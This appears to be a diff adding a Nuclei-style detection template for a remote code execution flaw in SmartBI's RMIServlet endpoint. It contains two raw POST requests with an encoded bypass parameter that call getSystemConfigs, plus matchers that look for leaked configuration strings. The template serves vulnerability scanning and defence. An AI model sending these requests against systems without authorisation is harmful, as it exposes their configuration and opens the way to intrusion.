@@ -1,0 +1,32 @@
+id: smartbi-smartbi_rce
+info:
+  name: SmartBI RCE Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects potential for Remote Code Execution in SmartBI software via the RMIServlet endpoint.
+http:
+  - raw:
+      - |
+        POST /smartbi/vision/RMIServlet?windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=ConfigClientService&methodName=getSystemConfigs&params=[]
+      - |
+        POST /vision/RMIServlet?windowUnloading=%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=ConfigClientService&methodName=getSystemConfigs&params=[]
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "(sB(3x)sflQlD)6fxA3MhkfhD)6"
+          - "\"ADVANCED_SYSTEM_CONFIG_ITEM\""
+        part: body
+      - type: word
+        part: body
+        words:
+          - "# 公共设置"
